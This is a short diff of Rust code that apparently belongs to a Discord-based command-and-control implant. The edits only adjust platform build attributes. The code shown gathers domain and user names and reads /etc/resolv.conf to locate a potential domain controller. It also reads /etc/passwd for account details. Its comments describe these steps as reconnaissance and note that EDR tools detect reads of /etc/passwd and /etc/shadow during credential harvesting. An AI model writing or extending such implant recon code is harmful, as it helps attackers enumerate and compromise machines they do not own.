@@ -11,7 +11,7 @@ use std::path::Path;
 /// # Returns
 ///
 /// A `String` containing the user information in the format "domain:user".
-#[cfg(windows)]
+#[cfg(target_os = "windows")]
 pub fn user() -> String {
     let domain = env::var("USERDOMAIN").unwrap_or("Unknown Hostname".to_string());
     let user = env::var("USERNAME").unwrap_or("Unknown User".to_string());
@@ -19,7 +19,7 @@ pub fn user() -> String {
     format!("{}:{}", &domain, &user)
 }
 
-#[cfg(not(windows))]
+#[cfg(target_os = "linux")]
 pub fn user() -> String {
     // linux does not really have a concept of AD domains, just return the hostname
     // from /etc/hostname which usually has a FQDN
@@ -51,7 +51,7 @@ pub async fn ip() -> Result<String, DiscordC2Error> {
 /// get the contents of the glibc DNS resolver file /etc/resolv.conf for a potential Windows domain controller DNS server.
 /// userspace software MUST be able to read /etc/resolv.conf, otherwise DNS resolution would be broken. this is always
 /// available.
-#[cfg(not(windows))]
+#[cfg(target_os = "linux")]
 pub fn get_resolv_conf() -> String {
     let resolv_conf = Path::new("/etc/resolv.conf");
     let file = fs::read_to_string(resolv_conf).unwrap_or("Unknown".to_string());
@@ -62,7 +62,7 @@ pub fn get_resolv_conf() -> String {
 /// /etc/passwd contains valuable information about the users on the machine such as the default shells, if accounts are
 /// locked, the default HOME directories per account, the description of the accounts, their user ID, and group ID.
 /// warning: EDRs WILL detect any attempts at reading /etc/passwd for recon, just like /etc/shadow for cred harvesting
-#[cfg(not(windows))]
+#[cfg(target_os = "linux")]
 pub fn get_etc_passwd() -> String {
     let etc_passwd = Path::new("/etc/passwd");
     let file = fs::read_to_string(etc_passwd).unwrap_or("Unknown".to_string());
